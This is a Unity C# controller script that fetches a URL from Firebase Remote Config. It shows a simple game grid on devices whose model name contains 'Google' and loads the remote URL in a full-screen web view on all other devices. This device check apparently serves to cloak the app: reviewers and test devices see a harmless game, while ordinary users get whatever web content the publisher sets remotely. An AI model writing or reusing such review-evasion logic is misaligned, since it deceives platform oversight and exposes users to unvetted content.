using Sirenix.OdinInspector;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using UnityEngine;

public class ApplicationController : MonoBehaviour
{
    [SerializeField]
    private MyFireBaseRemoteConfig remoteConfig;

    [SerializeField]
    private UniWebView webView;

    [SerializeField]
    private UniWebViewNativeListener listener;

    [SerializeField]
    private CellsCreator cellsCreator;

    public string savedUrl { get; set; }

    private bool isWebViewShown;

#if UNITY_EDITOR

    private async void Start()
    {
        savedUrl = PlayerPrefs.GetString("URL");

        if (string.IsNullOrEmpty(savedUrl))
            await LoadUrl();
        else
            StartWebView(savedUrl);
    }

#endif

    [Button]
    public void ClearPrefs()
    {
        PlayerPrefs.DeleteAll();
    }


    private bool CheckModel()
    {
        Debug.Log(SystemInfo.deviceModel);
        if (SystemInfo.deviceModel.Contains("Google") || SystemInfo.deviceModel.Contains("google"))
            return false;
        else
            return true;
    }

    public void StartWebView(string fbUrl)
    {
        webView.OnPageStarted += (view, url) => {
            if (fbUrl != url)
                webView.SetBackButtonEnabled(true);
            else if (fbUrl == url)
                webView.SetBackButtonEnabled(false);

            print("Web view loading finished for: " + url);
        };

        webView.Load(fbUrl);
        webView.Show();
    }

    public async Task LoadUrl()
    {
        var fbUrl = await GetUrl();
        var check = CheckModel();

        Debug.Log("Check model:" + check);
        Debug.Log(fbUrl);

        if (string.IsNullOrEmpty(fbUrl) || !check)
            cellsCreator.SetCells();

        else
        {
            PlayerPrefs.SetString("URL", fbUrl);
            webView.OnPageStarted += (view, url) => {
                if (url != fbUrl)
                    webView.SetBackButtonEnabled(true);
                else if(url == fbUrl)
                    webView.SetBackButtonEnabled(false);

                print("Web view loading finished for: " + url);
            };

            webView.Load(fbUrl);
            webView.SetShowToolbar(true);
            isWebViewShown = webView.Show();
        }
            
    }

    private async Task<string> GetUrl()
    {
        await remoteConfig.FetchDataAsync();

        return Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue("url_string").StringValue;
    }
}
